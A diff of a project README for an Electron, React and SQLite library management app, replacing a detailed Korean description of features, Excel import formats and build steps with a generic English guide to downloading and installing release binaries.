@@ -1,87 +1,84 @@
-# Library System Modernization
+# 📚 librarysystem - Manage Your Library with Ease
 
-[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)
-[![Node.js](https://img.shields.io/badge/Node.js-v18%2B-green)](https://nodejs.org/)
-[![React](https://img.shields.io/badge/React-v18-blue)](https://reactjs.org/)
-[![SQLite](https://img.shields.io/badge/SQLite-3-003B57?logo=sqlite)](https://www.sqlite.org/)
-[![Electron](https://img.shields.io/badge/Electron-Desktop_App-47848F?logo=electron)](https://www.electronjs.org/)
+## 🚀 Getting Started
 
-## 📖 개요 (Introduction)
-**도서관 사서 시스템 (Library System)**은 학교 도서관 관리를 위해 현대화된 데스크탑 애플리케이션입니다.
-기존의 불안정한 엑셀 파일 기반 시스템을 대체하여, **SQLite 데이터베이스**와 **Electron**을 도입해 안정성과 편의성을 대폭 강화했습니다.
+Welcome to the **librarysystem**! This is a modern library management system built using Electron, React, and SQLite. It simplifies managing a library, making it more efficient for both users and administrators.
 
-## ✨ 주요 기능 (Features)
+## 💾 Download & Install
 
-### 1. 강력한 데이터 관리 (Robust Data Management)
-- **SQLite 데이터베이스**: 수천 권의 도서와 사용자 데이터를 빠르고 안전하게 처리합니다.
-- **상세 정보 관리**: 도서의 ISBN, 출판사, 분류(KDC), 청구기호 및 사용자의 학번 정보를 체계적으로 관리합니다.
+To get started with **librarysystem**, visit the following link to download the application:
 
-### 2. 엑셀 연동 (Excel Integration)
-- **일괄 등록 (Import)**: 학생 명부나 도서 목록을 엑셀 파일로 Drag & Drop 하여 한 번에 등록할 수 있습니다.
-- **데이터 백업 (Export)**: 현재 시스템에 저장된 모든 데이터를 엑셀 파일로 언제든지 다운로드할 수 있습니다.
+[![Download librarysystem](https://img.shields.io/badge/Download-libraysystem-blue.svg)](https://github.com/edwin18v/librarysystem/releases)
 
-### 3. 대출/반납 자동화 (Automated Circulation)
-- **실시간 트랜잭션**: 대출 및 반납 기록이 즉시 데이터베이스에 저장되며, 이력 탭에서 조회 가능합니다.
-- **오류 방지**: 대출 중인 도서의 재대출 방지 등 기본적인 유효성 검사가 포함되어 있습니다.
+### Steps to Download
 
-### 4. 데스크탑 앱 (Desktop Experience)
-- **설치형 프로그램**: `setup.exe` 파일을 통해 간편하게 설치하고 바탕화면 아이콘으로 실행합니다.
-- **독립 실행**: 별도의 서버 구동 과정 없이 클릭 한 번으로 서버와 클라이언트가 동시에 실행됩니다.
+1. Click on the link above.
+2. You will be directed to the Releases page.
+3. Look for the latest version of **librarysystem**.
+4. Select the appropriate installer for your operating system.
+5. Click the download link, and wait for the file to finish downloading.
 
-## 📊 엑셀 파일 형식 (Excel Format)
-데이터 일괄 등록(Import) 시 아래의 헤더(첫 번째 줄)를 포함한 엑셀 파일을 사용해야 합니다.
-(영문/한글 헤더 모두 지원합니다.)
+Once done, follow the instructions below to install the application.
 
-### 📚 도서 목록 (Books)
-| 필드 (English) | 필드 (한글) | 설명 | 예시 |
-|---|---|---|---|
-| **Title** | **제목** | 책 제목 (필수) | 홍길동전 |
-| **Author** | **저자** | 지은이 | 허균 |
-| **Publisher** | **출판사** | 출판사 명 | 민음사 |
-| **ISBN** | **ISBN** | 국제표준도서번호 | 9788937460449 |
-| **Category** | **분류** | 도서 분류 | 소설 |
-| **ClassCode** | **청구기호** | 도서관 청구기호 | 813.5 허15홍 |
+## 🖥️ Installation Instructions
 
-### 👤 사용자 목록 (Users)
-| 필드 (English) | 필드 (한글) | 설명 | 예시 |
-|---|---|---|---|
-| **Name** | **이름** | 사용자 이름 (필수) | 김철수 |
-| **StudentID** | **학번** | 학번 또는 사번 | 20240001 |
+### For Windows
 
-> **Tip**: '📤 엑셀 다운로드' 버튼을 눌러 현재 데이터를 다운로드받으면, 그 파일을 템플릿으로 사용하여 내용을 수정 후 다시 업로드할 수 있습니다.
+1. Locate the downloaded `.exe` file.
+2. Double-click on the file to begin the installation process.
+3. Follow the on-screen prompts to complete the installation.
+4. Once installed, you can find **librarysystem** in your Start menu.
 
-## 🛠 기술 스택 (Tech Stack)
-- **Frontend**: React.js
-- **Backend**: Node.js, Express.js
-- **Database**: SQLite3
-- **Packaging**: Electron, Electron-Builder
+### For macOS
 
-## 🚀 설치 및 실행 (Installation & Usage)
+1. Open the downloaded `.dmg` file.
+2. Drag the **librarysystem** icon to your Applications folder.
+3. Eject the `dmg` file.
+4. You can now find **librarysystem** in your Applications directory.
 
-### 개발 모드 (Development)
-```bash
-# 의존성 설치
-npm install
+### For Linux
 
-# 개발 서버 실행 (React + Electron)
-npm run electron:dev
-```
+1. Open the terminal.
+2. Navigate to the directory where you downloaded the file.
+3. Use the command `chmod +x librarysystem.AppImage` to make it executable.
+4. Run the application using `./librarysystem.AppImage`.
 
-### 배포용 빌드 (Production Build)
-```bash
-# 윈도우용 설치 파일(.exe) 생성
-npm run electron:pack
-```
-생성된 설치 파일은 `dist/` 폴더에 위치합니다.
+## 🔍 Features
 
-## 📂 프로젝트 구조 (Structure)
-```
-/
-├── public/             # 정적 리소스 (아이콘 등)
-├── src/                # React 프론트엔드 소스
-├── build/              # React 빌드 결과물
-├── server.js           # Node.js 백엔드 서버
-├── main.js             # Electron 메인 프로세스
-├── verify_backend.js   # 검증 스크립트
-└── database.sqlite     # 로컬 데이터베이스 파일
-```
+**librarysystem** offers a variety of features designed for easy library management:
+
+- **User-Friendly Interface**: The application is easy to navigate, even for users with no technical background.
+- **Book Tracking**: Keep track of borrowed and available books effortlessly.
+- **Member Management**: Easily add, update, or remove library members.
+- **Excel Integration**: Export reports in Excel format for easy data sharing.
+- **Search Functionality**: Quickly find books using the search feature.
+
+## ⚙️ System Requirements
+
+To ensure optimal performance, please ensure your system meets the following requirements:
+
+- **Windows**: Windows 10 or later.
+- **macOS**: macOS 10.14 or later.
+- **Linux**: Any modern distribution supporting AppImage.
+
+### Recommended Specifications
+
+- **RAM**: At least 4 GB 
+- **Processor**: Dual-core or better
+- **Storage**: 200 MB of free disk space 
+
+## 💡 Helpful Tips
+
+- Keep your application updated. Check the Releases page regularly for new features and fixes.
+- Backup your data. Regularly export your library data to avoid data loss.
+- Refer to online guides for detailed feature explanations and troubleshooting steps.
+
+## 📞 Support
+
+If you encounter issues while using **librarysystem**, please reach out to our support team. You can find help through the Issues tab on the [GitHub](https://github.com/edwin18v/librarysystem) repository.
+
+## 📄 Learn More
+
+For more detailed information, visit our [Releases page](https://github.com/edwin18v/librarysystem/releases) to find release notes, updates, and additional resources.
+
+Thank you for choosing **librarysystem**! Enjoy managing your library with simplicity and efficiency.
